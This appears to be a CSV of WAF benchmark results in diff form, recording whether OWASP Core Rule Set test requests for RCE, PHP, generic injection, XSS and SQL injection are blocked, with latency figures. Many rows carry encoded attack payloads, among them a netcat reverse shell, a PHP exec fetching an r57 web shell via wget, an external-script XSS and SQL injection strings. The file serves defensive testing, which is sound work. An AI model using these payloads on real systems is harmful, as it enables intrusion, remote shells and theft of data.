+rust,932220,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932220.yaml,1,POST,/post,21,1.29,403,0,200,1,44.3,73.61,141.03,403:8,
+rust,932240,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932240.yaml,1,POST,/post,31,1.39,403,0,200,1,43.9,76.59,142.21,403:8,
+rust,932281,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932281.yaml,1,GET,/get?932281-1=%7B%2Cecho%2C%23test%7D,0,1.4,403,0,200,1,52.2,74.57,112.59,403:8,
+rust,932210,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932210.yaml,1,GET,/get?foo=;\n.shell%20nc%2010.10.10.1%206666%20-e%20sh\n,0,1.32,403,0,200,1,45.2,73.04,109.49,403:8,
+rust,932271,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932271.yaml,1,GET,/get?932271-1=%7E0,0,1.37,403,0,200,1,45.3,73.04,139.17,403:8,
+rust,932300,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932300.yaml,1,GET,/get?attackme=%0d%0aMAIL%20FROM%3A%3Ca%40b.com%3E,0,1.34,403,0,200,1,52.5,75.78,111.76,403:8,
+rust,932310,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932310.yaml,1,POST,/post,485,1.31,403,0,200,1,45.1,73.97,106.65,403:8,
+rust,932320,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932320.yaml,1,GET,/get?attackme=%0d%0aRETR%20123,0,1.35,403,0,200,1,45.1,75.31,110.88,403:8,
+rust,932236,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932236.yaml,1,POST,/post,39,1.41,403,0,200,1,50.5,76.86,116.06,403:8,
+rust,932239,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932239.yaml,1,GET,/get,0,1.35,403,0,200,1,45.4,73.44,107.82,403:8,
+rust,932161,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932161.yaml,1,GET,/get,0,1.4,403,0,200,1,55.2,70.95,107.58,403:8,
+rust,932390,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932390.yaml,1,POST,/,39,1.37,403,0,200,1,45.7,72.73,108.5,403:8,
+rust,932015,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
+rust,932016,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
+rust,932232,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932232.yaml,1,GET,/get?arg=%7Cvi%20%28x,0,1.36,403,0,200,1,41.2,78.28,156.19,403:8,
+rust,932237,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932237.yaml,1,GET,/get,0,1.4,403,0,200,1,55.5,71.81,106.85,403:8,
+rust,932238,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932238.yaml,1,POST,/post,37,1.33,403,0,200,1,54.1,73.82,109.19,403:8,
+rust,932290,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932290.yaml,1,GET,/get?932290-1=%27i%27fconfig,0,1.34,403,0,200,1,51.8,75.84,115.85,403:8,
+rust,932190,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932190.yaml,1,GET,/get?id=cat%2B%2Fet*%2F*wd,0,1.33,403,0,200,1,55.1,72.29,107.85,403:8,
+rust,932350,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932350.yaml,1,POST,/post,4,1.39,403,0,200,1,51.5,74.55,113.77,403:8,
+rust,932301,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932301.yaml,1,GET,/get?test=%0d%0aDATA,0,1.33,403,0,200,1,43.8,72.26,143.9,403:8,
+rust,932311,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932311.yaml,1,GET,/get?attackme=%0d%0aa001%20EXAMINE%20INBOX,0,1.42,403,0,200,1,45.0,72.97,108.27,403:8,
+rust,932321,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932321.yaml,1,GET,/get?attackme=%0d%0aQUIT,0,1.42,403,0,200,1,45.3,72.92,108.74,403:8,
+rust,932331,REQUEST-932-APPLICATION-ATTACK-RCE.conf,932331.yaml,1,GET,/get?rce=!1,0,1.33,403,0,200,1,45.4,75.55,111.94,403:8,
+rust,932017,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
+rust,932018,REQUEST-932-APPLICATION-ATTACK-RCE.conf,,,,,,,,,,,,,,,no usable official request case
+rust,933011,REQUEST-933-APPLICATION-ATTACK-PHP.conf,,,,,,,,,,,,,,,no usable official request case
+rust,933012,REQUEST-933-APPLICATION-ATTACK-PHP.conf,,,,,,,,,,,,,,,no usable official request case
+rust,933100,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933100.yaml,1,GET,/get?foo=%3C%3F%20exec%28%27wget%20http%3A%2F%2Fr57.biz%2Fr57.txt%20-O,0,1.16,403,0,200,1,53.5,74.38,111.0,403:8,
+rust,933110,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933110.yaml,2,GET,/upload1,0,1.0,403,0,200,1,44.8,72.57,108.83,403:8,
+rust,933120,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933120.yaml,1,POST,/post,42,0.97,403,0,200,1,51.4,77.61,114.65,403:8,
+rust,933130,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933130.yaml,2,GET,/get?x=$_SERVER['test'];,0,1.2,403,0,200,1,45.8,71.51,138.1,403:8,
+rust,933135,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933135.yaml,1,GET,/get?foo=%24%7B%27ff%27%7D,0,0.99,403,0,200,1,53.4,74.5,111.64,403:8,
+rust,933140,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933140.yaml,1,POST,/post,16,1.19,403,0,200,1,50.4,77.33,115.64,403:8,
+rust,933200,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933200.yaml,1,GET,/get/test.php?file=phar://phpinfo.zip/phpinfo.txt,0,1.19,403,0,200,1,45.3,72.62,109.58,403:8,
+rust,933150,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933150.yaml,1,GET,/get/?test=base64_decode(),0,1.16,403,0,200,1,45.4,72.9,138.79,403:8,
+rust,933160,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933160.yaml,1,GET,/get?foo=chr%28123%29,0,1.09,403,0,200,1,44.9,73.84,141.14,403:8,
+rust,933170,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933170.yaml,1,GET,/get/serialize0?foo=O%3A8%3A%22stdClass%22%3A0%3A%7B%7D,0,1.09,403,0,200,1,45.4,72.17,140.25,403:8,
+rust,933180,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933180.yaml,2,POST,/,15,1.12,403,0,200,1,44.7,74.22,112.46,403:8,
+rust,933210,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933210.yaml,3,GET,/get?x=%28system%29%28%27uname%27%29%20%3B,0,1.12,403,0,200,1,45.6,71.84,107.83,403:8,
+rust,933220,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933220.yaml,1,GET,/upload,0,1.21,403,0,200,1,54.8,71.71,109.15,403:8,
+rust,933013,REQUEST-933-APPLICATION-ATTACK-PHP.conf,,,,,,,,,,,,,,,no usable official request case
+rust,933014,REQUEST-933-APPLICATION-ATTACK-PHP.conf,,,,,,,,,,,,,,,no usable official request case
+rust,933151,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933151.yaml,1,GET,/get/array_diff%20%28,0,1.19,403,0,200,1,45.4,73.17,108.04,403:8,
+rust,933152,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933152.yaml,1,GET,/get/pg_enter_pipeline_mode%20%28,0,0.99,403,0,200,1,44.6,72.57,141.09,403:8,
+rust,933153,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933153.yaml,1,GET,/get/sodium_crypto_aead_chacha20poly1305_ietf_keygen%20%28,0,1.12,403,0,200,1,54.2,73.61,109.52,403:8,
+rust,933015,REQUEST-933-APPLICATION-ATTACK-PHP.conf,,,,,,,,,,,,,,,no usable official request case
+rust,933016,REQUEST-933-APPLICATION-ATTACK-PHP.conf,,,,,,,,,,,,,,,no usable official request case
+rust,933131,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933131.yaml,3,GET,/get?x=$_%53%20ERVER['REQUEST_URI'];,0,1.04,403,0,200,1,52.2,76.42,115.57,403:8,
+rust,933161,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933161.yaml,1,POST,/post?%20checkDate%28%29,14,1.2,403,0,200,1,45.5,72.23,107.21,403:8,
+rust,933111,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933111.yaml,1,POST,/post,214,1.05,400,0,400,0,37.2,93.52,120.88,400:8,target-independent HTTP 400
+rust,933190,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933190.yaml,1,POST,/post,56,1.01,403,0,200,1,51.0,75.66,113.38,403:8,
+rust,933211,REQUEST-933-APPLICATION-ATTACK-PHP.conf,933211.yaml,3,GET,/get?x=%28system%29%28%27uname%27%29%20%3B,0,1.16,403,0,200,1,44.3,72.13,142.23,403:8,
+rust,933017,REQUEST-933-APPLICATION-ATTACK-PHP.conf,,,,,,,,,,,,,,,no usable official request case
+rust,933018,REQUEST-933-APPLICATION-ATTACK-PHP.conf,,,,,,,,,,,,,,,no usable official request case
+rust,934011,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,,,,,,,,,,,,,,,no usable official request case
+rust,934012,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,,,,,,,,,,,,,,,no usable official request case
+rust,934100,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934100.yaml,1,GET,/get?foo=_%24%24ND_FUNC%24%24_,0,1.04,403,0,200,1,51.3,77.63,113.97,403:8,
+rust,934110,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934190.yaml,17,GET,/get/test?url=http%3A%2F%2Flocalhost%2F,0,1.02,403,0,200,1,45.5,72.6,109.44,403:8,
+rust,934190,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934190.yaml,1,GET,/get/test?url=localhost/,0,0.98,403,0,200,1,45.4,74.47,109.6,403:8,
+rust,934130,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934130.yaml,2,POST,/post,82,1.01,403,0,200,1,51.6,74.84,112.98,403:8,
+rust,934150,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934150.yaml,1,GET,/get?x=Process.spawn(%22id%22),0,1.0,403,0,200,1,51.2,75.01,116.37,403:8,
+rust,934160,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934160.yaml,2,GET,/get?eval=while(!false),0,1.03,403,0,200,1,44.9,72.99,138.91,403:8,
+rust,934170,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934170.yaml,1,GET,"/get?ssrf=data:text/plain;base64,SSBsb3ZlIFBIUAo=",0,0.72,403,0,200,1,53.0,73.56,111.61,403:8,
+rust,934200,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934200.yaml,1,GET,/get?x=%7b%7b7*7%7d%7d,0,0.97,403,0,200,1,45.2,74.72,110.8,403:8,
+rust,934013,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,,,,,,,,,,,,,,,no usable official request case
+rust,934014,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,,,,,,,,,,,,,,,no usable official request case
+rust,934101,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934101.yaml,1,GET,/get?foo=%23%7Brequire.main.constructor._load%28child_process%29.spawn%28%27foo%27%2C%5B%27bar%27%2C%27bar%27%5D%29%7D,0,0.99,403,0,200,1,45.7,72.38,106.53,403:8,
+rust,934120,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934120.yaml,1,GET,/get?ssrf=http://2852039166/,0,0.99,403,0,200,1,54.4,73.05,108.38,403:8,
+rust,934140,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934140.yaml,1,GET,/get?x=%40%7B%5Bsystem%20%27whoami%27%5D%7D,0,0.7,403,0,200,1,39.9,84.64,133.17,403:8,
+rust,934180,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934180.yaml,1,GET,/get?x=%7b%25%20%69%66%20%54%72%75%65%20%25%7d%34%39%7b%25%20%65%6e%64%69%66%20%25%7d,0,1.03,403,0,200,1,45.3,73.12,108.67,403:8,
+rust,934220,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934220.yaml,1,POST,/post,70,1.02,403,0,200,1,44.4,72.89,142.55,403:8,
+rust,934015,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,,,,,,,,,,,,,,,no usable official request case
+rust,934016,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,,,,,,,,,,,,,,,no usable official request case
+rust,934210,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,934210.yaml,1,POST,/post,119,0.74,403,0,200,1,44.2,72.86,141.54,403:8,
+rust,934017,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,,,,,,,,,,,,,,,no usable official request case
+rust,934018,REQUEST-934-APPLICATION-ATTACK-GENERIC.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941011,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941012,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941010,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941100,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941100.yaml,1,GET,"/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=""http://www.w3.org/1999/xhtml"">setTimeout(""top.frame2.location=""javascript:(function+()+{var+x+=+document.createElement(\\""script\\"");x.src+=+\\""//sdl.me/popup.js?//\\"";document.childNodes\\[0\\].appendChild(x);}());"""",1000)</script>&//",0,0.68,403,0,200,1,44.3,74.04,113.79,403:8,
+rust,941110,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941110.yaml,1,GET,/get,0,0.98,403,0,200,1,45.8,70.92,108.22,403:8,
+rust,941120,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941120.yaml,1,POST,/post?%20%20onload%3d%20=vardata,0,1.0,403,0,200,1,53.5,73.94,112.52,403:8,
+rust,941130,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941130.yaml,1,GET,"/get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E",0,1.03,403,0,200,1,52.1,76.46,112.19,403:8,
+rust,941140,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941140.yaml,1,POST,/post,73,1.0,403,0,200,1,51.9,76.65,112.73,403:8,
+rust,941160,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941160.yaml,1,GET,"/get/demo/xss/xml/vuln.xml.php?input=<script+xmlns=""http://www.w3.org/1999/xhtml"">setTimeout(""top.frame2.location=""javascript:(function+()+{var+x+=+document.createElement(\\""script\\"");x.src+=+\\""//sdl.me/popup.js?//\\"";document.childNodes\\[0\\].appendChild(x);}());"""",1000)</script>&//",0,1.03,403,0,200,1,53.9,72.86,109.33,403:8,
+rust,941170,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941170.yaml,1,GET,"/get/char_test?mime=text/xml&body=%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%20src=%22data:,alert(1)%22%20/%3E",0,0.99,403,0,200,1,55.5,71.63,106.43,403:8,
+rust,941180,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941180.yaml,1,POST,/post/foo,24,1.01,403,0,200,1,44.7,74.83,113.53,403:8,
+rust,941190,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941190.yaml,1,POST,/post,58,1.0,403,0,200,1,44.1,75.66,142.94,403:8,
+rust,941200,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941200.yaml,1,POST,/post,62,1.01,403,0,200,1,52.2,75.95,110.45,403:8,
+rust,941210,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941210.yaml,1,POST,/post,34,1.05,403,0,200,1,44.8,75.03,110.08,403:8,
+rust,941220,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941220.yaml,1,POST,/post,101,1.03,403,0,200,1,44.4,74.35,113.82,403:8,
+rust,941230,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941230.yaml,1,POST,/post,41,1.05,403,0,200,1,44.7,72.62,141.13,403:8,
+rust,941240,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941240.yaml,1,GET,/get?var=%3c%3fimport%20implementation%20%3d,0,1.01,403,0,200,1,44.7,73.17,142.15,403:8,
+rust,941250,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941250.yaml,1,POST,/post,38,1.02,403,0,200,1,45.0,77.66,113.43,403:8,
+rust,941260,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941260.yaml,1,POST,/post,40,0.99,403,0,200,1,45.0,73.83,110.88,403:8,
+rust,941270,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941270.yaml,1,GET,/get?var=%3clink%20%2f%20asdf%20href%20%20%2f%3d%20,0,1.03,403,0,200,1,33.6,85.25,168.48,403:8,
+rust,941280,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941280.yaml,1,GET,/get?var=%3cBASE%20dsfds%20HREF%20%2f%20%3d,0,1.04,403,0,200,1,44.0,75.12,143.07,403:8,
+rust,941290,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941290.yaml,1,POST,/post,46,1.01,403,0,200,1,45.0,72.73,108.75,403:8,
+rust,941300,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941300.yaml,1,GET,/get?%3cOBJECT%20data%20%3d=sdffdsa,0,1.05,403,0,200,1,53.4,74.32,110.96,403:8,
+rust,941310,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941310.yaml,1,POST,/post,51,1.02,403,0,200,1,49.9,77.05,119.72,403:8,
+rust,941350,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941350.yaml,1,GET,/get/xx?id=%252bADw-script%252bAD4-,0,0.99,403,0,200,1,45.1,72.72,140.08,403:8,
+rust,941360,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941360.yaml,1,POST,/post,1229,1.02,403,0,200,1,53.0,73.62,111.41,403:8,
+rust,941370,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941370.yaml,1,POST,/post,39,1.01,403,0,200,1,52.1,73.5,112.99,403:8,
+rust,941390,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941390.yaml,1,GET,/get?arg=setInterval%28code%2C%201%29,0,0.99,403,0,200,1,53.2,75.0,109.69,403:8,
+rust,941400,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941400.yaml,1,GET,/get?xss=%5B%5D.sort.call%60%24%7Balert%7D1337%60,0,1.01,403,0,200,1,45.9,71.03,106.8,403:8,
+rust,941013,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941014,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941101,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941101.yaml,2,GET,"/get/""onmouseover='prompt(document.cookie)'""",0,1.01,403,0,200,1,45.8,72.16,108.05,403:8,
+rust,941150,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941150.yaml,1,POST,/post,35,0.75,403,0,200,1,51.9,74.59,114.92,403:8,
+rust,941181,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941181.yaml,1,POST,/post/foo,12,1.02,403,0,200,1,53.8,73.57,110.27,403:8,
+rust,941320,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941320.yaml,1,POST,/post,14,0.96,403,0,200,1,51.3,76.07,113.93,403:8,
+rust,941330,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941330.yaml,1,GET,/get?var=%22in%20\u0076\u0061l\u0075e\u004F\u0066%3d,0,1.02,403,0,200,1,53.3,73.26,112.04,403:8,
+rust,941340,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941340.yaml,1,POST,/post,31,1.02,403,0,200,1,50.2,76.66,115.13,403:8,
+rust,941380,REQUEST-941-APPLICATION-ATTACK-XSS.conf,941380.yaml,1,GET,/get/login?user=%20x%20%7B%7Bconstructor.constructor(%27alert(1)%27)()%7D%7D%20.%20ff,0,1.03,403,0,200,1,44.8,71.73,140.61,403:8,
+rust,941015,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941016,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941017,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,941018,REQUEST-941-APPLICATION-ATTACK-XSS.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942011,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942012,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942100,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942100.yaml,1,POST,/post,15,1.08,403,0,200,1,42.8,75.33,144.7,403:8,
+rust,942140,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942140.yaml,1,GET,/get?sql_table=pg_catalog,0,0.97,403,0,200,1,44.1,73.45,142.45,403:8,
+rust,942151,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942151.yaml,1,POST,/post,167,1.14,403,0,200,1,45.2,79.08,116.24,403:8,
+rust,942160,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942160.yaml,1,GET,/get?sql_table=sleep%28534543%29,0,1.14,403,0,200,1,54.3,73.31,109.44,403:8,
+rust,942170,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942170.yaml,1,GET,/get?var=SELECT%20BENCHMARK%281000000%2C1%2B1%29%3B,0,1.19,403,0,200,1,45.1,73.89,109.98,403:8,
+rust,942190,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942190.yaml,1,GET,/get?var=%20exec%20xp_cmdshell,0,1.13,403,0,200,1,45.5,75.23,110.95,403:8,
+rust,942220,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942220.yaml,1,GET,/get?string_to_convert=4294967296,0,1.15,403,0,200,1,52.5,73.98,111.95,403:8,
+rust,942230,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942230.yaml,1,GET,/get?var=%29%20like%20%28,0,0.86,403,0,200,1,52.6,73.99,111.47,403:8,
+rust,942240,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942240.yaml,1,POST,/post,24,1.17,403,0,200,1,51.5,77.26,114.25,403:8,
+rust,942250,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942250.yaml,1,GET,/get?var=EXECUTE%20IMMEDIATE%20%22,0,1.14,403,0,200,1,45.4,71.34,108.78,403:8,
+rust,942270,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942270.yaml,1,GET,/get?var=union%20select%20col%20from,0,1.13,403,0,200,1,44.1,74.15,140.6,403:8,
+rust,942280,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942280.yaml,1,GET,/get?var=select%20pg_sleep,0,1.09,403,0,200,1,53.5,72.82,110.55,403:8,
+rust,942290,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942290.yaml,1,GET,/get/mongo/show.php?u_id[$ne]=2,0,1.14,403,0,200,1,52.9,75.35,111.26,403:8,
+rust,942320,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942320.yaml,1,POST,/post,29,1.2,403,0,200,1,50.6,78.76,113.93,403:8,
+rust,942350,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942350.yaml,1,GET,/get?var=%3bINSERT%20INTO%20table%20%28col%29%20VALUES,0,1.11,403,0,200,1,45.8,72.19,107.48,403:8,
+rust,942360,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942360.yaml,1,POST,/post,56,1.1,403,0,200,1,54.2,72.84,108.8,403:8,
+rust,942500,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942500.yaml,1,GET,/get?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0},0,1.13,403,0,200,1,44.9,73.16,140.87,403:8,
+rust,942540,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942540.yaml,1,POST,/post,27,1.15,403,0,200,1,43.9,72.92,143.09,403:8,
+rust,942560,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942560.yaml,1,GET,/get,118,1.05,403,0,200,1,45.2,73.73,110.43,403:8,
+rust,942550,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942550.yaml,1,POST,/post,105,1.15,403,0,200,1,45.1,74.75,112.62,403:8,
+rust,942013,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942014,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942120,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942120.yaml,1,GET,/get?var=blahblah&var2=LIKE%20NULL,0,1.15,403,0,200,1,52.3,75.91,111.2,403:8,
+rust,942130,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942130.yaml,2,GET,/get?a=1=1,0,1.15,403,0,200,1,52.7,74.17,112.44,403:8,
+rust,942131,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942131.yaml,1,GET,/get?a=11!=1,0,1.16,403,0,200,1,45.2,71.8,139.76,403:8,
+rust,942150,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942150.yaml,1,POST,/post,45,1.15,403,0,200,1,50.9,76.12,113.83,403:8,
+rust,942180,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942180.yaml,1,GET,/get?var=3%27%20%27%201,0,1.13,403,0,200,1,52.3,73.85,112.53,403:8,
+rust,942200,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942200.yaml,1,POST,/post,20,1.1,403,0,200,1,51.7,75.49,112.85,403:8,
+rust,942210,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942210.yaml,1,POST,/post,29,1.21,403,0,200,1,37.7,90.42,144.28,403:8,
+rust,942260,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942260.yaml,1,GET,/get?var=something%20LIKE%20%27,0,1.16,403,0,200,1,45.3,73.47,110.47,403:8,
+rust,942300,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942300.yaml,1,POST,/post,27,1.15,403,0,200,1,44.7,75.24,112.92,403:8,
+rust,942310,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942310.yaml,2,GET,/get?var='%20and%201%20in%20(select%20min(name)%20from%20sysobjects%20where%20xtype%20%3D%20'U'%20and%20name%20%3E%20'.')%20--,0,1.16,403,0,200,1,53.8,73.46,108.19,403:8,
+rust,942330,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942330.yaml,1,POST,/post,24,1.1,403,0,200,1,53.1,73.86,108.68,403:8,
+rust,942340,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942340.yaml,1,GET,/get?var=in%20%28%20select%20%2a%20from,0,1.03,403,0,200,1,53.2,74.8,110.96,403:8,
+rust,942361,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942361.yaml,1,POST,/post,8,1.05,403,0,200,1,40.7,79.33,158.46,403:8,
+rust,942362,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942362.yaml,1,POST,/post,56,1.13,403,0,200,1,45.2,74.2,109.41,403:8,
+rust,942370,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942370.yaml,1,POST,/post,22,1.08,403,0,200,1,44.5,72.84,141.28,403:8,
+rust,942380,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942380.yaml,1,POST,/post,35,1.1,403,0,200,1,45.5,73.48,108.15,403:8,
+rust,942390,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942390.yaml,1,GET,/get?var=sdfsd%27or%201%20%3e%201,0,1.15,403,0,200,1,45.5,71.02,139.28,403:8,
+rust,942400,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942400.yaml,1,POST,/post,36,1.12,403,0,200,1,52.6,74.62,110.07,403:8,
+rust,942410,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942410.yaml,1,POST,/post,4,1.02,403,0,200,1,52.5,73.63,112.54,403:8,
+rust,942470,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942470.yaml,1,POST,/post,12,1.12,403,0,200,1,45.7,71.56,109.57,403:8,
+rust,942480,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942480.yaml,1,GET,/get?'msdasql',0,1.07,403,0,200,1,44.9,73.49,110.34,403:8,
+rust,942430,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942430.yaml,3,POST,/post,80,1.09,200,0,,0,,,,,target rule not proven
+rust,942440,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942440.yaml,1,GET,/get?var=DROP%20sampletable%3b--,0,1.15,403,0,200,1,53.1,74.03,111.75,403:8,
+rust,942450,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942450.yaml,1,POST,/post,19,1.11,403,0,200,1,51.0,75.85,114.13,403:8,
+rust,942510,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942510.yaml,1,GET,/get?`bla`,0,0.97,403,0,200,1,45.1,73.28,109.32,403:8,
+rust,942520,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942520.yaml,1,POST,/post,20,1.12,403,0,200,1,49.4,77.69,116.82,403:8,
